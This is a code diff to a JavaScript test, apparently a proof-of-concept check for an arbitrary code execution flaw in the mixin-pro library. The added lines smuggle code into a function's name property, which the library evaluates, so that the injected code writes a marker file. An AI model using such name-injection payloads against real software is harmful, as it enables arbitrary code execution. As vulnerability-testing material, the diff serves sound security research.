@@ -5,10 +5,16 @@ test("Arbitrary code execution in mixin-pro", () => {
   const path = "./mixin-pro";
   file_exist = fs.existsSync(path);
   expect(file_exist).toBe(false);
-  try {
-    let Bar1 = Class({
-      constructor: require(`fs`).writeFileSync("mixin-pro", ``),
-    });
+  try {      
+      function Foo() { }
+      Object.defineProperty(Foo, "name", {
+        enumerable: false,
+        configurable: false,
+        writable: true,
+        value: 'static'
+      });
+      Foo.name = "test2()\n{}; require(`fs`).writeFileSync('mixin-pro', ''); function __ctor"
+      let Bar1 = Class(Foo, { constructor: Foo });
   } catch (error) {}
   file_exist = fs.existsSync(path);
   expect(file_exist).toBe(true);
